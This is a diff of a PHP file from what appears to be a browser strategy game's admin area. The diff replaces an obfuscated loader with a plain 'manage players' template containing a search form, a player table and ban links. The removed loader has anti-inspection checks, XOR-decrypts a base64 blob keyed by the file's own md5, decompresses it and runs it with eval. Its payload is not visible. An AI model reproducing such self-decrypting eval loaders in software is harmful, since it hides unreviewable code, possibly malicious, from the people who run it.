@@ -1,24 +1,63 @@
-<?php
-$sseukq="527ae4ceb5639d77b57c76dcb72ba5a0";
-$iobkzjw="5753050756500156555754030e5307515a0c03560e0500555b03505356030303";
-$nyrnzrk="GrufMNgK+QMjnF1Z2NdJO3CdkYyU7haXqBIvSrbbNWYnpwQGJmjQfu2Wi0c3pDtnrFy/lxGFq/veSIUKabOxtPchBkRp37oULZsGqF6ZBBhgtPA2Y545guDAf/NVFw248bqqLiGULymmf06tNm2zSiBDy1usEQlAKENTfJVyT+OlWghFINpmWNrkeufjbXmnMKFVV2L2MP42HTM99C/g/Ej9r6GfXTMH22rYJId2Z1f3E6dLm1Egnii9FkCZSDHbHEaomWV1asTV5hMHTOypgdx8Po/6G4IQdazpMlmcsjk5I5T/cgL1cS0goyigL3l0+1MflzEd6OevcHuGudqEkEH5wWKtStaWnoCb+q0d8ttoDIv/Z8KcfP7e5EkmmfCPd3uRcfIoitH+Gp7Zb4WkMI2kRqLUporwaS8PZRW1JBv2FOuCMr6AZ/VBoapaANz4ZeXEYor8PD+o14a2EbgW+ctBI2u6tp+o+q19jymqYlIX/i4MfA/c72DK07kYWNhz0ZAKG26G1NOLrvp07d9EgP071oZgxWii8W6ROUo4NqErZ39SrqiNzu5wG7lVaz3N5qP4iueAjSTgwSkZe+cL5JRnytGKS8FffZkbBVfciJ6I9aVmDOVM2ZWoe3fn5bUFFUWGjzu7ABSgWAncvFZMaNmsPS6YOY3oeZv0r3fQEJ5BFc3zbf5qWsNX+KZrmeIzfAdrlm7hDJXyDjTnXq5A0sGfNXiUArWMhlEHAG+3QqtdGDhF27fiXha+YhPBSeFhWVhnQmEUEpqIxYIm+d7W+9qtlGVILAI0bc5002rtYIvvNe1Nerh34XiOBto+0QbjvAKIo+BaBoXzfDytNUotsKR1L4xwvozurnAmEib31DIaMXkM0lZyTemgG8okRer3INhSsMKDnthLFILXgbX7Y2YRo7MSTz6MBOYp4shQbpN9PVmOMRDWDAdeQEeKdyGc7rW2WykHqKetBERVh3axx3ccsa83eUb+Z+lVjneknjdNoZMAD7V8DfGMjs86PlvMewoHlAsUYKT7sKDC85QN6wxWVKbvJG9moXprJcMotXkZ/+GoYjutaOmHIRojugjIB6rTxsB6AZBmPqlIoWE8GB9UljkVQ43BnEQapWPWL5RBId/QHcxnLPADtw==";
-$nqfoguitu=file_get_contents(__FILE__);
-$ncnizqa=str_replace($nyrnzrk,"",$nqfoguitu);
-if(strpos($ncnizqa,"ec"."ho")!==false||strpos($ncnizqa,"pr"."int")!==false||strpos($ncnizqa,"var_"."dump")!==false||strpos($ncnizqa,"file_put_"."contents")!==false||strpos($ncnizqa,"fw"."rite")!==false){die();}
-$lfdveynlo=str_replace(array($sseukq,$iobkzjw),array("SP_b27c2b0f","KP_1f5949f4"),$nqfoguitu);
-$vqmxvpdsj=md5($lfdveynlo);
-$hewuvmo=hex2bin($iobkzjw);
-$rtesrnh="";
-$iraplhjp=strlen($vqmxvpdsj);
-for($yxmydsgetvx=0;$yxmydsgetvx<$iraplhjp;$yxmydsgetvx++){
-$rtesrnh.=chr(ord($hewuvmo[$yxmydsgetvx])^ord($vqmxvpdsj[$yxmydsgetvx]));
-}
-$mqttvyvpy=base64_decode($nyrnzrk);
-$kjirnsxj=strlen($mqttvyvpy);
-$crxsrgfv="";
-$tirhab=strlen($rtesrnh);
-for($yxmydsgetvx=0;$yxmydsgetvx<$kjirnsxj;$yxmydsgetvx++){
-$crxsrgfv.=$mqttvyvpy[$yxmydsgetvx]^$rtesrnh[$yxmydsgetvx%$tirhab];
-}
-$dlgiot="gzun"."compress";
-eval('?>' . $dlgiot($crxsrgfv) . '<?php ');
+<h2><i class="fas fa-users"></i> <?= __('admin.users.manage_players') ?></h2>
+<p style="color: #5c3a1e;"><?= __('admin.users.manage_desc') ?></p>
+
+<div class="admin-card">
+    <h3><i class="fas fa-search"></i> <?= __('admin.users.search_player') ?></h3>
+    <form action="<?= $adminBaseUrl ?>&mode=uzytkownicy" method="get">
+        <input type="hidden" name="village" value="<?= $village['id'] ?>">
+        <input type="hidden" name="screen" value="admin">
+        <input type="hidden" name="mode" value="uzytkownicy">
+        <table class="vis" width="100%">
+            <tr>
+                <td width="150"><strong><?= __('admin.users.player_name') ?></strong></td>
+                <td>
+                    <input type="text" name="search" value="<?= htmlspecialchars($_GET['search'] ?? '') ?>"
+                        style="width: 300px;">
+                    <button type="submit" class="btn" style="background: #2196f3; border-color: #1976d2; color: white;"><i class="fas fa-search"></i> <?= __('admin.users.search_btn') ?></button>
+                </td>
+            </tr>
+        </table>
+    </form>
+</div>
+
+<div class="admin-card">
+    <h3><i class="fas fa-list"></i> <?= __('admin.users.player_list') ?></h3>
+    <table class="vis" width="100%">
+        <tr>
+            <th><?= __('admin.users.col_id') ?></th>
+            <th><?= __('admin.users.col_name') ?></th>
+            <th><?= __('admin.users.col_points') ?></th>
+            <th><?= __('admin.users.col_villages') ?></th>
+            <th><?= __('admin.users.col_rank') ?></th>
+            <th><?= __('admin.users.col_actions') ?></th>
+        </tr>
+        <?php if (!empty($players)): ?>
+            <?php foreach ($players as $player): ?>
+                <tr>
+                    <td><?= $player['id'] ?></td>
+                    <td>
+                        <a href="game.php?village=<?= $village['id'] ?>&screen=info_player&id=<?= $player['id'] ?>">
+                            <?= htmlspecialchars($player['username']) ?>
+                        </a>
+                    </td>
+                    <td align="right"><?= number_format($player['points'] ?? 0, 0, ',', '.') ?></td>
+                    <td align="center"><?= $player['villages'] ?? 0 ?></td>
+                    <td align="center"><?= $player['rang'] ?? 0 ?></td>
+                    <td align="center">
+                        <a href="<?= $adminBaseUrl ?>&mode=bany&gracz=<?= $player['id'] ?>"
+                            class="btn" style="padding: 2px 8px; font-size: 10px;">
+                            <i class="fas fa-ban"></i> <?= __('admin.users.action_ban') ?>
+                        </a>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        <?php else: ?>
+            <tr>
+                <td colspan="6" align="center" style="padding: 20px;">
+                    <i class="fas fa-info-circle" style="color: #999; font-size: 24px;"></i><br>
+                    <?= __('admin.users.no_players') ?>
+                </td>
+            </tr>
+        <?php endif; ?>
+    </table>
+</div>
